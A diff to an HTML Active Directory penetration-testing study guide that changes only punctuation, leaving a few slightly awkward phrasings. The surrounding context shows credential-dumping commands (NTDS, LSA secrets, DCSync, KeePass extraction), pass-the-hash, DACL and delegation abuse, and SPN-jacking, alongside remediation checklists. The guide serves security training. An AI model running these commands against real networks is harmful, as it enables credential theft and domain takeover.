-<tr><td>elieser</td><td>Owns</td><td>nicole</td><td>Owner privileges -- modify DACL</td></tr>
+<tr><td>elieser</td><td>Owns</td><td>nicole</td><td>Owner privileges; modify DACL</td></tr>
 <tr><td>cherly</td><td>ReadLAPSPassword</td><td>LAPS01</td><td>Read local admin password</td></tr>
 <tr><td>cherly</td><td>ReadGMSAPassword</td><td>svc_devadm</td><td>Read gMSA password blob</td></tr>
 <tr><td>elizabeth</td><td>AllExtendedRights</td><td>elieser</td><td>Force password change, read LAPS, etc.</td></tr>
@@ -4358,13 +4358,13 @@ Domain:[domain]</code></pre>
 </tbody>
 </table>
 
-<p>Next, examine the <strong>Domain Users</strong> group -- every domain user inherits its rights. Check:</p>
+<p>Next, examine the <strong>Domain Users</strong> group; every domain user inherits its rights. Check:</p>
 <ul>
 <li><strong>Local Admin Rights:</strong> Domain Users should never have local admin anywhere</li>
-<li><strong>Outbound Object Control > Transitive Object Control:</strong> Reveals all objects that any domain user controls -- a critical finding</li>
+<li><strong>Outbound Object Control > Transitive Object Control:</strong> Reveals all objects that any domain user controls; a critical finding</li>
 </ul>
 
-<p>Run pathfinding from <code>DOMAIN USERS@DOMAIN</code> to <code>DOMAIN ADMINS@DOMAIN</code>. If a path exists, it means <strong>every user in the domain</strong> has a path to Domain Admin -- a critical vulnerability.</p>
+<p>Run pathfinding from <code>DOMAIN USERS@DOMAIN</code> to <code>DOMAIN ADMINS@DOMAIN</code>. If a path exists, it means <strong>every user in the domain</strong> has a path to Domain Admin; a critical vulnerability.</p>
 
 <h4 id="bh-analysis-prebuilt">4.8.2 Pre-Built Analytics Queries</h4>
 
@@ -4381,7 +4381,7 @@ Domain:[domain]</code></pre>
 <tr><td>Shortest Paths from Kerberoastable Users</td><td>Paths from Kerberoastable users to DA</td><td>Crack SPN hash + follow path = DA</td></tr>
 <tr><td>Shortest Path from Owned Principals</td><td>What can compromised nodes reach?</td><td>Plan next moves after compromise</td></tr>
 <tr><td>Shortest Paths to Domain Admins from Owned Principals</td><td>Direct path from owned to DA</td><td>Fastest route to objective</td></tr>
-<tr><td>Shortest Paths to High-Value Targets</td><td>Paths to default and custom high-value targets</td><td>Broader than just DA -- includes any marked high-value</td></tr>
+<tr><td>Shortest Paths to High-Value Targets</td><td>Paths to default and custom high-value targets</td><td>Broader than just DA; includes any marked high-value</td></tr>
 </tbody>
 </table>
 
@@ -4510,7 +4510,7 @@ RETURN p</code></pre>
 
 <h4 id="cypher-advanced">4.9.5 Advanced and Custom Queries</h4>
 
-<p><strong>The most powerful query</strong> -- find all paths from a compromised user to ANY node:</p>
+<p><strong>The most powerful query</strong>: find all paths from a compromised user to ANY node:</p>
 
 <pre><code class="language-sql">-- Shortest path from a specific node to anything (the "universal" query)
 MATCH p = shortestPath((n)-[*1..]->(c))
@@ -4672,7 +4672,7 @@ Expand-Archive .\BlueHound-win32-x64-1.1.0.zip .
 # 2. Configurations tab: set Domain Admins group, crown jewels servers
 # 3. Query Runner: click RUN ALL to populate reports</code></pre>
 
-<p>BlueHound supports custom Cypher-based dashboard widgets. Example -- count enabled users:</p>
+<p>BlueHound supports custom Cypher-based dashboard widgets. Example; count enabled users:</p>
 
 <pre><code class="language-sql">MATCH (u:User {enabled:true})
 RETURN COUNT(u)</code></pre>
@@ -4740,7 +4740,7 @@ Removing the relationship Contains between [domain] and WS01.[domain] breaks the
 <table class="custom-table">
 <thead><tr><th>Node</th><th>Description</th></tr></thead>
 <tbody>
-<tr><td><code>AZTenant</code></td><td>Azure AD tenant -- dedicated instance of Azure AD</td></tr>
+<tr><td><code>AZTenant</code></td><td>Azure AD tenant; dedicated instance of Azure AD</td></tr>
 <tr><td><code>AZUser</code></td><td>User in Azure AD (email, display name, job title)</td></tr>
 <tr><td><code>AZGroup</code></td><td>Group in Azure AD for access management</td></tr>
 <tr><td><code>AZApp</code></td><td>Application registration in Azure AD</td></tr>
@@ -4801,7 +4801,7 @@ PS C:\Tools\TheEdgeMaker> .\TheEdgeMaker.ps1
 # Log in with your Azure account when prompted
 # Keep default location (East US) or change as needed</code></pre>
 
-<p>After TheEdgeMaker completes, note the <strong>tenant name</strong> (e.g., <code>plaintexthacktheboxgmail.onmicrosoft.com</code>) -- you will need it for AzureHound.</p>
+<p>After TheEdgeMaker completes, note the <strong>tenant name</strong> (e.g., <code>plaintexthacktheboxgmail.onmicrosoft.com</code>); you will need it for AzureHound.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -5065,7 +5065,7 @@ echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf</code></pre></li>
 
 <pre><code class="language-bash">netexec rdp [subnet] -u [user] -p '[password]' -d [domain]</code></pre>
 
-<p>A result showing <code>(Pwn3d!)</code> indicates the user has RDP rights on that target -- it does not mean the user has administrative privileges.</p>
+<p>A result showing <code>(Pwn3d!)</code> indicates the user has RDP rights on that target; it does not mean the user has administrative privileges.</p>
 
 <h4 id="rdp-windows">5.2.2 Lateral Movement from Windows</h4>
 
@@ -5636,7 +5636,7 @@ Enter-PSSession SRV02.[domain] -Authentication Negotiate</code></pre>
 
 <p><strong>JEA</strong> is a security technology for delegated administration with PowerShell. It limits users to executing only predefined commands and accessing specific resources, reducing the attack surface. JEA creates PowerShell endpoints with tailored roles and capabilities.</p>
 
-<p>Potential abuse: JEA configurations may allow executing commands that provide escalation paths. Research resources include "Just Too Much Administration -- Breaking JEA" and "Breaking The Microsoft JEA Technology To Hack A System."</p>
+<p>Potential abuse: JEA configurations may allow executing commands that provide escalation paths. Research resources include "Just Too Much Administration; Breaking JEA" and "Breaking The Microsoft JEA Technology To Hack A System."</p>
 
 <h4 id="winrm-linux">5.5.8 Lateral Movement from Linux</h4>
 
@@ -6020,7 +6020,7 @@ Get-WmiObject -Class Win32_Product | Select-Object Name | Where-Object { $_.Name
 
 <p><strong>Windows Server Update Services (WSUS)</strong> is a Microsoft service for distributing updates and patches across an enterprise without requiring direct internet access. WSUS is widely used in Windows corporate networks and operates on <strong>port 8530</strong> (HTTP) by default.</p>
 
-<p>Why WSUS is a compelling target: Even in heavily restricted networks, client machines must connect to the WSUS server to receive updates. By compromising the WSUS server, we can deploy malicious "updates" that execute arbitrary commands on any machine trusting that WSUS server. This is <strong>indirect lateral movement</strong> -- the target pulls the payload rather than having it pushed directly.</p>
+<p>Why WSUS is a compelling target: Even in heavily restricted networks, client machines must connect to the WSUS server to receive updates. By compromising the WSUS server, we can deploy malicious "updates" that execute arbitrary commands on any machine trusting that WSUS server. This is <strong>indirect lateral movement</strong>: the target pulls the payload rather than having it pushed directly.</p>
 
 <p>Root cause: WSUS trusts the server to provide legitimate updates, and the update mechanism executes binaries as <code>NT AUTHORITY\SYSTEM</code>. If an attacker controls the WSUS server, they control what code runs on every managed client.</p>
 
@@ -7048,7 +7048,7 @@ crackmapexec smb [target-ip] -u [user] -p '[password]' -X '$PSVersionTable' --am
 
 <h4 id="exec-winrm">6.15.3 WinRM Command Execution</h4>
 
-<p>WinRM does not require the user to be a local admin -- membership in the <strong>Remote Management Users</strong> group or explicit PS Remoting permissions suffice.</p>
+<p>WinRM does not require the user to be a local admin; membership in the <strong>Remote Management Users</strong> group or explicit PS Remoting permissions suffice.</p>
 
 <pre><code class="language-bash"># cmd.exe via WinRM
 crackmapexec winrm [target-ip] -u [user] -p '[password]' -x whoami
@@ -7104,7 +7104,7 @@ crackmapexec smb [dc-ip] -u [user] -p '[password]' --ntds --enabled</code></pre>
 
 <pre><code class="language-bash"># Use NTLM hash instead of password
 crackmapexec winrm [target-ip] -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth -x whoami</code></pre><h4 id="secrets-lsa">6.16.4 LSA Secrets and Cached Credentials</h4>
-<p>LSA Secrets include: cached domain credentials (DCC2/MS Cache 2), machine account keys, DPAPI keys, and service account passwords. DCC2 hashes use Hashcat mode <code>2100</code> and <strong>cannot</strong> be used for Pass-the-Hash -- they must be cracked:</p>
+<p>LSA Secrets include: cached domain credentials (DCC2/MS Cache 2), machine account keys, DPAPI keys, and service account passwords. DCC2 hashes use Hashcat mode <code>2100</code> and <strong>cannot</strong> be used for Pass-the-Hash; they must be cracked:</p>
 
 
 <pre><code class="language-bash">crackmapexec smb [target-ip] -u [user] -p '[password]' --lsa
@@ -7248,18 +7248,18 @@ crackmapexec smb DC_IP -u [user] -p [password] -M bh_owned -o PASS=YourNeo4jPass
 
 <h4 id="mod-ldap">6.19.1 LDAP Protocol Modules</h4>
 
-<p><strong>get-network</strong> -- DNS record enumeration from AD-integrated DNS:</p>
+<p><strong>get-network</strong>: DNS record enumeration from AD-integrated DNS:</p>
 <pre><code class="language-bash">crackmapexec ldap [dc-fqdn] -u [user] -p [password] -M get-network -o ALL=true</code></pre>
 
-<p><strong>laps</strong> -- Retrieve LAPS passwords for managed computers:</p>
+<p><strong>laps</strong>: Retrieve LAPS passwords for managed computers:</p>
 <pre><code class="language-bash">crackmapexec ldap [dc-fqdn] -u [user] -p [password] -M laps
 # Use COMPUTER option for specific targets
 crackmapexec ldap [dc-fqdn] -u [user] -p [password] -M laps -o COMPUTER=MS01</code></pre>
 
-<p><strong>MAQ</strong> -- Check MachineAccountQuota (needed for RBCD attacks):</p>
+<p><strong>MAQ</strong>: Check MachineAccountQuota (needed for RBCD attacks):</p>
 <pre><code class="language-bash">crackmapexec ldap [dc-fqdn] -u [user] -p '[password]' -M maq</code></pre>
 
-<p><strong>daclread</strong> -- Read and export DACLs, find DCSync rights:</p>
+<p><strong>daclread</strong>: Read and export DACLs, find DCSync rights:</p>
 <pre><code class="language-bash"># Read all ACEs for a user
 crackmapexec ldap [dc-fqdn] -u '' -p '' -M daclread -o TARGET=[user] ACTION=read
 
@@ -7268,21 +7268,21 @@ crackmapexec ldap [dc-fqdn] -u [user] -p [password] -M daclread -o TARGET_DN="DC
 
 <h4 id="mod-smb">6.19.2 SMB Protocol Modules</h4>
 
-<p><strong>get_netconnections / ioxidresolver</strong> -- Discover additional network interfaces:</p>
+<p><strong>get_netconnections / ioxidresolver</strong>: Discover additional network interfaces:</p>
 <pre><code class="language-bash"># WMI-based (includes IPv6)
 crackmapexec smb TARGET -u user -p pass -M get_netconnections
 
 # RPC-based (no IPv6)
 crackmapexec smb TARGET -u user -p pass -M ioxidresolver</code></pre>
 
-<p><strong>keepass_discover / keepass_trigger</strong> -- Find and extract KeePass databases:</p>
+<p><strong>keepass_discover / keepass_trigger</strong>: Find and extract KeePass databases:</p>
 <pre><code class="language-bash"># Discover KeePass processes and config files
 crackmapexec smb TARGET -u user -p pass -M keepass_discover
 
 # Full extraction in one command
 crackmapexec smb TARGET -u user -p pass -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/path/to/KeePass.config.xml</code></pre>
 
-<p><strong>rdp</strong> -- Enable/disable RDP:</p>
+<p><strong>rdp</strong>: Enable/disable RDP:</p>
 <pre><code class="language-bash">crackmapexec smb TARGET -u user -p pass -M rdp -o ACTION=enable</code></pre>
 
 
@@ -7576,7 +7576,7 @@ cmedb (workspace)(smb) > shares</code></pre></li>
 <!-- ============================================================ -->
 <h3 id="kerb-overview">7.1 Kerberos Overview and Authentication Process</h3>
 
-<p>Kerberos is a <strong>stateless, ticket-based authentication protocol</strong> that operates on <strong>port 88</strong> and has been the default authentication protocol for Active Directory domain accounts since Windows 2000. It is a <strong>zero-knowledge proof protocol</strong> -- the user's password is never transmitted over the network. Instead, shared secret keys and a ticketing mechanism prove identity and authorize access to services.</p>
+<p>Kerberos is a <strong>stateless, ticket-based authentication protocol</strong> that operates on <strong>port 88</strong> and has been the default authentication protocol for Active Directory domain accounts since Windows 2000. It is a <strong>zero-knowledge proof protocol</strong>: the user's password is never transmitted over the network. Instead, shared secret keys and a ticketing mechanism prove identity and authorize access to services.</p>
 
 <p>There are three entities in every Kerberos transaction: the <strong>user</strong> (client), the <strong>service</strong> (application server), and the <strong>Key Distribution Center (KDC)</strong>, which runs on every Domain Controller and knows every account's secret key.</p>
 
@@ -7587,7 +7587,7 @@ cmedb (workspace)(smb) > shares</code></pre></li>
 
 <h4 id="kerb-benefits">7.1.1 Why Kerberos Over NTLM</h4>
 
-<p>Before Kerberos, authentication happened over SMB/NTLM. The user's NTLM hash was stored in memory upon authentication, meaning a compromised host exposed the hash for Pass-the-Hash attacks against <strong>any</strong> resource the user could access. Kerberos tickets, by contrast, do not contain a password and are scoped to a specific service. This is why the <strong>Double Hop Problem</strong> exists with WinRM -- Kerberos credentials are specific to each target service, so there is no password hash to silently forward.</p>
+<p>Before Kerberos, authentication happened over SMB/NTLM. The user's NTLM hash was stored in memory upon authentication, meaning a compromised host exposed the hash for Pass-the-Hash attacks against <strong>any</strong> resource the user could access. Kerberos tickets, by contrast, do not contain a password and are scoped to a specific service. This is why the <strong>Double Hop Problem</strong> exists with WinRM; Kerberos credentials are specific to each target service, so there is no password hash to silently forward.</p>
 
 <p>If a machine with active Kerberos sessions is compromised, a <strong>Pass-the-Ticket</strong> attack is possible, but the attacker is limited to the resources the victim already authenticated against, and tickets have a finite lifetime.</p>
 
@@ -7623,8 +7623,8 @@ proxychains4 -q crackmapexec smb [dc-ip] -u 'DC01$' -p '' --ntds</code></pre>
 
 <p>AS-REP: The KDC generates a temporary <strong>session key</strong> for future client-KDC exchanges and sends back two items:</p>
 <ol>
-<li>The <strong>TGT</strong> -- encrypted with the KDC's key, containing the user's information (PAC) and a copy of the session key.</li>
-<li>The <strong>session key</strong> -- encrypted with the user's key so the client can extract it.</li>
+<li>The <strong>TGT</strong>: encrypted with the KDC's key, containing the user's information (PAC) and a copy of the session key.</li>
+<li>The <strong>session key</strong>: encrypted with the user's key so the client can extract it.</li>
 </ol>
 
 <h4 id="kerb-tgs-exchange">7.1.4 TGS Exchange (Service Ticket Request)</h4>
@@ -8200,7 +8200,7 @@ Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofot
 <pre><code class="language-powershell">klist
 ls \\[dc-fqdn]\c$</code></pre>
 
-<p>Cleanup -- clear the RBCD attribute:</p>
+<p>Cleanup; clear the RBCD attribute:</p>
 
 <pre><code class="language-powershell">Import-Module .\PowerView.ps1
 $credentials = New-Object System.Management.Automation.PSCredential "[DOMAIN]\[user]", (ConvertTo-SecureString "[password]" -AsPlainText -Force)
@@ -8251,7 +8251,7 @@ psexec.py -k -no-pass [dc-fqdn]</code></pre>
 </ul>
 <h3 id="kerb-golden">7.8 Golden Ticket</h3>
 
-<p>A <strong>Golden Ticket</strong> is a forged TGT created using the <code>krbtgt</code> account's NTLM hash. Because the KDC encrypts all TGTs with the <code>krbtgt</code> key, possessing this hash allows an attacker to forge a TGT with arbitrary PAC contents -- any username (even non-existent), any group memberships (including Domain Admins, Enterprise Admins), and a very long lifetime (Mimikatz defaults to 10 years).</p>
+<p>A <strong>Golden Ticket</strong> is a forged TGT created using the <code>krbtgt</code> account's NTLM hash. Because the KDC encrypts all TGTs with the <code>krbtgt</code> key, possessing this hash allows an attacker to forge a TGT with arbitrary PAC contents; any username (even non-existent), any group memberships (including Domain Admins, Enterprise Admins), and a very long lifetime (Mimikatz defaults to 10 years).</p>
 
 <p>Root cause: The TGT's authenticity relies solely on being encrypted with the <code>krbtgt</code> key. The KDC does not validate the PAC contents against the directory when a TGT is presented for a TGS request. If the attacker knows the <code>krbtgt</code> hash, they can create any identity.</p>
 
@@ -8814,7 +8814,7 @@ dir \\[sql-fqdn]\c$</code></pre>
 <li><label><input type="checkbox"> Maintain a <strong>baseline</strong> of processes, applications, and network activity on all hosts.</label></li>
 <li><label><input type="checkbox"> Restrict <strong>administrative access</strong> across hosts and services (principle of least privilege).</label></li>
 <li><label><input type="checkbox"> Centralize logging to a SIEM for effective detection and triage.</label></li>
-<li><label><input type="checkbox"> Sometimes simple solutions are the most effective -- know what "normal" looks like so you can spot the abnormal.</label></li>
+<li><label><input type="checkbox"> Sometimes simple solutions are the most effective; know what "normal" looks like so you can spot the abnormal.</label></li>
 </ul>
 
 
@@ -8838,7 +8838,7 @@ dir \\[sql-fqdn]\c$</code></pre>
 <!-- ============================================================ -->
 <h3 id="dacls-overview">8.1 DACLs Overview</h3>
 
-<p>Within the Windows security ecosystem, <strong>tokens</strong> and <strong>security descriptors</strong> are the two main variables of the object security equation. Tokens identify the security context of a process or thread, while security descriptors contain the security information associated with an object. To enforce the <strong>Confidentiality</strong> pillar of the CIA triad, Windows uses <strong>Access Control Lists (ACLs)</strong> -- a mechanism that enumerates which system entities are permitted to access a resource and which access modes are granted to each entity (per RFC 4949).</p>
+<p>Within the Windows security ecosystem, <strong>tokens</strong> and <strong>security descriptors</strong> are the two main variables of the object security equation. Tokens identify the security context of a process or thread, while security descriptors contain the security information associated with an object. To enforce the <strong>Confidentiality</strong> pillar of the CIA triad, Windows uses <strong>Access Control Lists (ACLs)</strong>: a mechanism that enumerates which system entities are permitted to access a resource and which access modes are granted to each entity (per RFC 4949).</p>
 
 <figure><img src="./img/cape/acl-abuse-mindmap.png" alt="ACL abuse attack paths mindmap showing GenericAll, WriteDacl, WriteProperty and associated tools"></figure>
 
@@ -8857,7 +8857,7 @@ dir \\[sql-fqdn]\c$</code></pre>
 
 <h4 id="security-descriptors">8.1.1 Security Descriptors</h4>
 
-<p>Every Windows object (also called a <strong>securable object</strong>) has a <strong>security descriptor</strong> -- a binary data structure specifying who can perform what actions on the object. Windows represents it internally via the <code>SECURITY_DESCRIPTOR</code> struct with six main fields:</p>
+<p>Every Windows object (also called a <strong>securable object</strong>) has a <strong>security descriptor</strong>: a binary data structure specifying who can perform what actions on the object. Windows represents it internally via the <code>SECURITY_DESCRIPTOR</code> struct with six main fields:</p>
 
 <pre><code class="language-csharp">typedef struct _SECURITY_DESCRIPTOR {
     BYTE                        Revision;
@@ -8871,8 +8871,8 @@ dir \\[sql-fqdn]\c$</code></pre>
 
 <p>Security descriptors come in two forms:</p>
 <ul>
-<li><strong>Absolute</strong> -- contains pointers to the actual data. This is what you encounter when interacting with Windows objects in memory.</li>
-<li><strong>Self-relative</strong> -- stores actual data in a contiguous memory block rather than using pointers. Used for storing on disk or transmitting over the wire.</li>
+<li><strong>Absolute</strong>: contains pointers to the actual data. This is what you encounter when interacting with Windows objects in memory.</li>
+<li><strong>Self-relative</strong>: stores actual data in a contiguous memory block rather than using pointers. Used for storing on disk or transmitting over the wire.</li>
 </ul>
 
 <p>Control flags: The <code>Control</code> member is a 16-bit set of bit flags that qualify the meaning of the security descriptor. Key flags include:</p>
@@ -8895,8 +8895,8 @@ dir \\[sql-fqdn]\c$</code></pre>
 
 <p>SACL and DACL:</p>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> <strong>SACL (System Access Control List)</strong> -- contains ACEs that dictate which access attempts generate audit records in the security event log. Managed by administrators for auditing purposes.</label></li>
-<li><label><input type="checkbox"> <strong>DACL (Discretionary Access Control List)</strong> -- contains ACEs that dictate which principals have control rights over a specific object. This is the primary target for DACL attacks.</label></li>
+<li><label><input type="checkbox"> <strong>SACL (System Access Control List)</strong>: contains ACEs that dictate which access attempts generate audit records in the security event log. Managed by administrators for auditing purposes.</label></li>
+<li><label><input type="checkbox"> <strong>DACL (Discretionary Access Control List)</strong>: contains ACEs that dictate which principals have control rights over a specific object. This is the primary target for DACL attacks.</label></li>
 </ul>
 
 
@@ -8933,9 +8933,9 @@ dir \\[sql-fqdn]\c$</code></pre>
 
 <p><strong>Object-specific ACEs</strong> (those containing the keyword "Object") are used <strong>only within Active Directory</strong>. In addition to the standard ACE members, object-specific ACEs contain:</p>
 <ul>
-<li><strong>ObjectType</strong> -- a GUID identifying a child object type, property set, property, extended right, or validated write.</li>
-<li><strong>InheritedObjectType</strong> -- specifies the type of child object that can inherit the ACE.</li>
-<li><strong>Flags</strong> -- indicates whether <code>ObjectType</code> and <code>InheritedObjectType</code> are present.</li>
+<li><strong>ObjectType</strong>: a GUID identifying a child object type, property set, property, extended right, or validated write.</li>
+<li><strong>InheritedObjectType</strong>: specifies the type of child object that can inherit the ACE.</li>
+<li><strong>Flags</strong>: indicates whether <code>ObjectType</code> and <code>InheritedObjectType</code> are present.</li>
 </ul>
 
 <h4 id="viewing-dacls-manually">8.1.3 Viewing DACLs of AD Objects Manually</h4>
@@ -8972,7 +8972,7 @@ $parsedSecurityDescriptor.Access | Where-Object {$_.IdentityReference -like '*Pe
 <pre><code class="language-powershell"># Using AccessChk to view the security descriptor of explorer.exe
 .\accesschk64.exe -p "explorer.exe" -l</code></pre>
 
-<p>The key difference between DACLs of AD objects and normal objects is the values that the <code>Mask</code> member can have -- AD objects use a richer set of object-specific access rights.</p>
+<p>The key difference between DACLs of AD objects and normal objects is the values that the <code>Mask</code> member can have; AD objects use a richer set of object-specific access rights.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -9085,12 +9085,12 @@ python3 dacledit.py -principal [user] -target Rita -dc-ip [target-ip] [domain]/[
 
 <h4 id="enumerating-bloodhound">8.2.4 Auditing DACLs with BloodHound</h4>
 
-<p>Manual enumeration of DACLs does not scale -- the sheer number of ACEs across a domain makes manual analysis impractical. <strong>BloodHound</strong> collects all DACLs and correlates them into graph models, making abusable access rights easy to discover.</p>
+<p>Manual enumeration of DACLs does not scale; the sheer number of ACEs across a domain makes manual analysis impractical. <strong>BloodHound</strong> collects all DACLs and correlates them into graph models, making abusable access rights easy to discover.</p>
 
 <p>BloodHound separates control rights into two categories:</p>
 <ul>
-<li><strong>Inbound Control Rights</strong> -- equivalent to inspecting an object's DACL (who has rights over this object?).</li>
-<li><strong>Outbound Control Rights</strong> -- aggregation of all references to an object's SID across all DACLs in the domain (what does this object have rights over?).</li>
+<li><strong>Inbound Control Rights</strong>: equivalent to inspecting an object's DACL (who has rights over this object?).</li>
+<li><strong>Outbound Control Rights</strong>: aggregation of all references to an object's SID across all DACLs in the domain (what does this object have rights over?).</li>
 </ul>
 
 <h4>Methodology</h4>
@@ -9194,7 +9194,7 @@ Set-DomainObject -Identity TARGET -Clear serviceprincipalname</code></pre></li>
 <p>The <strong>AddMembers</strong> abuse allows an attacker to add users to a group when they control a principal with write access to the group's <code>member</code> attribute. This is possible when the controlled account has <code>GenericAll</code>, <code>GenericWrite</code>, <code>Self</code> (Self-Membership), <code>AllExtendedRights</code>, or <code>WriteMembers</code> over the target group.</p>
 
 
-<p>Important distinction: <code>Self-Membership</code> only allows adding <strong>yourself</strong> to the group -- not arbitrary users. Other rights like <code>GenericAll</code> or <code>WriteMembers</code> allow adding any user.</p>
+<p>Important distinction: <code>Self-Membership</code> only allows adding <strong>yourself</strong> to the group; not arbitrary users. Other rights like <code>GenericAll</code> or <code>WriteMembers</code> allow adding any user.</p>
 
 <h4 id="addmembers-identify">8.4.1 Identifying Vulnerable Groups</h4>
 
@@ -9294,9 +9294,9 @@ psexec.py administrator@DC_IP -hashes :NTHASH</code></pre>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Enumerate who has AddMember/Self-Membership rights over sensitive groups</label>
 <pre><code class="language-bash">python3 dacledit.py -principal ATTACKER -target 'TARGET GROUP' -dc-ip DC_IP DOMAIN/USER:PASS</code></pre></li>
-<li><label><input type="checkbox"> Add yourself to the group (Linux -- LDAP method)</label>
+<li><label><input type="checkbox"> Add yourself to the group (Linux; LDAP method)</label>
 <pre><code class="language-bash">python3 addusertogroup.py -d DOMAIN -g "GROUP" -a USER -u USER -p PASS</code></pre></li>
-<li><label><input type="checkbox"> Add yourself to the group (Windows -- PowerView)</label>
+<li><label><input type="checkbox"> Add yourself to the group (Windows; PowerView)</label>
 <pre><code class="language-powershell">Add-DomainGroupMember -Identity "GROUP" -Members USER -Verbose</code></pre></li>
 <li><label><input type="checkbox"> Re-authenticate to obtain updated group membership</label></li>
 <li><label><input type="checkbox"> Abuse newly gained privileges (e.g., Backup Operators -> extract SAM/SYSTEM/NTDS.dit)</label>
@@ -9491,7 +9491,7 @@ python3 dacledit.py -principal [user] -target-dn dc=[domain-short],dc=local -dc-
 
 <h4 id="writedacl-linux">8.6.2 Abusing WriteDACL from Linux</h4>
 
-<p>WriteDACL alone does not allow performing DCSync -- you must first use it to <strong>grant</strong> DCSync rights to your account.</p>
+<p>WriteDACL alone does not allow performing DCSync; you must first use it to <strong>grant</strong> DCSync rights to your account.</p>
 
 <pre><code class="language-bash"># Step 1: Verify DCSync fails before DACL modification
 secretsdump.py -just-dc-user krbtgt [domain]/[user]:[password]@DC_IP
@@ -9874,16 +9874,16 @@ KRB5CCNAME=&lt;target&gt;.ccache python3 getnthash.py -key &lt;AS-REP-key&gt; &l
 
 <h4>Remediation</h4>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Monitor <strong>Event ID 4768</strong> for TGT requests where <code>CertIssuerName</code> is non-empty (indicates PKINIT authentication) -- unusual in environments not using WHfB or smart cards</label></li>
-<li><label><input type="checkbox"> Monitor <strong>Event ID 5136</strong> for unauthorized modifications to the <code>msDS-KeyCredentialLink</code> attribute -- legitimate modifiers are typically Azure AD Connect sync accounts or ADFS service accounts</label></li>
+<li><label><input type="checkbox"> Monitor <strong>Event ID 4768</strong> for TGT requests where <code>CertIssuerName</code> is non-empty (indicates PKINIT authentication); unusual in environments not using WHfB or smart cards</label></li>
+<li><label><input type="checkbox"> Monitor <strong>Event ID 5136</strong> for unauthorized modifications to the <code>msDS-KeyCredentialLink</code> attribute; legitimate modifiers are typically Azure AD Connect sync accounts or ADFS service accounts</label></li>
 <li><label><input type="checkbox"> Regularly audit inbound object control for privileged accounts</label></li>
 <li><label><input type="checkbox"> Implement a <strong>deny ACE</strong> for principal <code>EVERYONE</code> on modifying <code>msDS-KeyCredentialLink</code> for accounts not enrolled in Key Trust passwordless authentication (especially privileged accounts)</label></li>
-<li><label><input type="checkbox"> Note: attackers with <code>WriteOwner</code> or <code>WriteDACL</code> can override this deny ACE -- configure a SACL to detect such changes</label></li>
+<li><label><input type="checkbox"> Note: attackers with <code>WriteOwner</code> or <code>WriteDACL</code> can override this deny ACE; configure a SACL to detect such changes</label></li>
 </ul>
 
 <h3 id="logon-scripts">9.2 Logon Scripts</h3>
 
-<p>In Active Directory environments, <strong>logon scripts</strong> automate tasks when users log into the domain -- mapping network drives, auditing, environment customization, etc. There are two methods for assigning logon scripts:</p>
+<p>In Active Directory environments, <strong>logon scripts</strong> automate tasks when users log into the domain; mapping network drives, auditing, environment customization, etc. There are two methods for assigning logon scripts:</p>
 
 <ol>
 <li><strong>Legacy logon scripts</strong> via the <code>scriptPath</code> attribute (set in the user's <strong>Profile</strong> tab in ADUC)</li>
@@ -10073,7 +10073,7 @@ Get-DomainObject eric -Properties scriptPath</code></pre>
 
 <h3 id="spn-jacking">9.3 SPN Jacking</h3>
 
-<p><strong>SPN Jacking</strong> is an alternative method to abuse <code>WriteSPN</code> rights. Unlike traditional WriteSPN abuse (Kerberoasting -- setting an SPN on a user account and cracking the TGS), SPN Jacking combines DACL abuse with Constrained Delegation manipulation to achieve impersonation without password cracking. This is described in the blog post "SPN-jacking: An Edge Case in WriteSPN Abuse."</p>
+<p><strong>SPN Jacking</strong> is an alternative method to abuse <code>WriteSPN</code> rights. Unlike traditional WriteSPN abuse (Kerberoasting; setting an SPN on a user account and cracking the TGS), SPN Jacking combines DACL abuse with Constrained Delegation manipulation to achieve impersonation without password cracking. This is described in the blog post "SPN-jacking: An Edge Case in WriteSPN Abuse."</p>
 
 <p>Root cause: When an account has Constrained Delegation configured (via <code>msDS-AllowedToDelegateTo</code>), it can request service tickets for the SPNs listed in that attribute via the S4U protocol. The service name in a Kerberos ticket is <em>not encrypted</em>, so it can be modified after issuance using tools like <code>Rubeus tgssub</code>. By manipulating which computer account "owns" a given SPN, an attacker can redirect the delegation target to a different machine.</p>
 
@@ -10082,8 +10082,8 @@ Get-DomainObject eric -Properties scriptPath</code></pre>
 <table class="custom-table">
 <thead><tr><th>Variant</th><th>Description</th><th>When to Use</th></tr></thead>
 <tbody>
-<tr><td>Ghost SPN-Jacking</td><td>Targets orphaned SPNs -- SPNs in <code>msDS-AllowedToDelegateTo</code> whose original computer/service account was deleted or renamed</td><td>When delegation references non-existent accounts</td></tr>
-<tr><td>Live SPN-Jacking</td><td>Targets SPNs currently in use -- requires removing the SPN from the live account and adding it to the target</td><td>When you have <code>WriteSPN</code> on both the source and target computer accounts</td></tr>
+<tr><td>Ghost SPN-Jacking</td><td>Targets orphaned SPNs; SPNs in <code>msDS-AllowedToDelegateTo</code> whose original computer/service account was deleted or renamed</td><td>When delegation references non-existent accounts</td></tr>
+<tr><td>Live SPN-Jacking</td><td>Targets SPNs currently in use; requires removing the SPN from the live account and adding it to the target</td><td>When you have <code>WriteSPN</code> on both the source and target computer accounts</td></tr>
 </tbody>
 </table>
 
@@ -10126,7 +10126,7 @@ ls \\web01\c$</code></pre>
 
 <h4 id="spn-live">9.3.2 Live SPN-Jacking</h4>
 
-<p>Live SPN-Jacking targets SPNs currently in use. The key challenge is that AD prevents duplicate SPNs -- assigning an SPN already associated with one account to another results in a <code>constraint violation</code>. The solution: first remove the SPN from the original account, then add it to the target.</p>
+<p>Live SPN-Jacking targets SPNs currently in use. The key challenge is that AD prevents duplicate SPNs; assigning an SPN already associated with one account to another results in a <code>constraint violation</code>. The solution: first remove the SPN from the original account, then add it to the target.</p>
 
 <p>Attack flow (Windows):</p>
 
@@ -10231,7 +10231,7 @@ ls \\target\c$</code></pre></li>
 
 <h3 id="samaccountname-spoofing">9.4 sAMAccountName Spoofing (NoPAC)</h3>
 
-<p>The <strong>NoPAC attack</strong> exploits two vulnerabilities -- <strong>CVE-2021-42278</strong> and <strong>CVE-2021-42287</strong> -- to enable a domain user to impersonate any privileged account, including domain controllers.</p>
